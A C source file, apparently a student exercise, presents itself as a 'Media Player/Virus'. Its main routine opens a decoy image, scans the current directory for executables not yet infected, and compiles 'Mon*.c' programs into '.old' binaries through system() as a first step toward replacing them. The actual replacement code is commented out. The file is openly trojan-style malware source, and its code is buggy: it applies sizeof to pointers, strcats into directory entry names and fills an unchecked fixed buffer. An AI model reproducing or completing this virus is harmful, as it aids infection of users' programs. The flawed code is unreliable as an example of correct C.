#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <string.h>
#include <stdbool.h>

char** getFiles();
void infecte(char** f);
bool dejaInfecte(char* f);
char* getExtension(char* f);

/**
 * Fonction pour récupérer l'extension d'un fichier
 */
char* getExtension(char* f){
    char* dot = strrchr(f, '.');
    return (!dot || dot == f) ? "" : dot+1;
}

/**
 * Fonction permettant de récupérer les noms des fichiers à infecter
 */
char** getFiles(){
    char** files = malloc(5*sizeof(char*)); // On alloue le mémoire à la variable files pour permettre de récupérer les noms des 5 programmes
    int cpt = 0; // Compteur du nombre de programmes
    DIR *repertoire = opendir("."); // Ouverture du répertoire courant pour parcourir les fochiers
    struct stat statsF; // Obtenir les statistiques d'un fichier
    struct dirent *lecture; // Obtenir le fichier courant
    //printf("Liste des fichiers exécutables : \n");
    while((lecture = readdir(repertoire))){
        /**
         * Lecture du répertoire
         */
        if ((stat(lecture->d_name, &statsF) == 0) && ((statsF.st_mode & S_IFMT) == S_IFREG) && (statsF.st_mode & S_IXUSR)) {
            /**
             * Si le fichier est exécutable et régulier
             */
            if (cpt<5 && (strcmp(lecture->d_name, "MediaPlayer.exe") != 0) && !dejaInfecte(lecture->d_name)) {
                /**
                 * Si l'exécutable n'est pas le media player et qu'il n'a pas déjà été infecté
                 */
                //printf("- %s\n", lecture->d_name);
                files[cpt] = lecture->d_name;
                cpt++;
            }

        }

    }
    closedir(repertoire);
    return files;
}

/**
 * Fonction permettant d'infecter les fichiers du répertoire
 */
void infecte(char** f){
    /**
     * Parcours le répertoire courant, et compile les programmes monPGn avec l'extension .old
     */
    DIR *rep = opendir(".");
    char* monPG;
    char* mediaPlayer;
    char* monPGNoExtension = NULL;
    if (rep!= NULL) {
        struct dirent *lecture;
        /**
         * Lecture des fichiers .c du répertoire afin de créer les executables .old apres infection
         */
        while((lecture = readdir(rep))){
            char* ext = getExtension(lecture->d_name);
            /**
             * Si l'extension du fichier est .c et que le nom du fichier commence par "Mon"
             */
            if ((strcmp(ext, "c") == 0) && (strncmp(lecture->d_name, "Mon", 3) == 0)) {
                monPG = lecture->d_name;
                monPGNoExtension = calloc(sizeof(monPG), 1);
                strncat(monPGNoExtension, monPG, sizeof(monPG)-2); // Nom du programme sans l'extension

                /**
                 * Création de la commande gcc
                 */
                char commande[80];
                strcpy(commande, "gcc -Wall ");
                strcat(commande, monPG);
                strcat(commande, " -o ");
                strcat(commande, monPGNoExtension);
                strcat(commande, ".old");
                system(commande); // Execution de la commande
            }


        }
        closedir(rep);
    }

    /*for(int i = 0; i < 5; i++)
    {   
        FILE *mediaPlayer;
		FILE *oldFile;
		FILE *newFile;

        char fileWithOld[strlen(f[i])+strlen(".old")];
		char currentFile[strlen(f[i])];

        strcpy(currentFile, f[i]);
        strcpy(fileWithOld, strcat(f[i], ".old"));
        rename(f[i], fileWithOld);

        mediaPlayer = fopen("MediaPlayer.c", "r");
    }*/
}


/**
 * Fonction permettant de vérifier qu'un fichier est déjà infecté ou non
 */
bool dejaInfecte(char* f){
    char* extension = ".old";
    if (strstr(f, extension) != NULL) {
        /**
         * Le fichier en paramètres ne possède pas l'extension .old
        */
        return true;
    } else{
        DIR* repertoire = opendir(".");
        struct dirent *lecture;
        while((lecture = readdir(repertoire))){
            if ((strcmp(lecture->d_name, f) == 0) && (fopen(strcat(lecture->d_name, extension), "r") != NULL)) {
                /**
                * Le fichier lu dans le répertoire et le fichier en paramètre sont les mêmes
                * Le fichier lu avec l'extension .old a été ouvert
                * Donc le fichier est infecté
                 */
                return true;
            }
        }
    }
    return false;
}

/**
 * Main du programme de Media Player/Virus
 */
int main(int argc, char const *argv[])
{
    system("xdg-open ../img/img1.jpg"); //Ouverture du système d'affichage d'images Linux grâce à la commande système qui permet d'executer des commandes bash
    char** files = getFiles(); // Récupération des fichiers à infecter
    infecte(files); // Infection des fichiers
    return EXIT_SUCCESS;
}
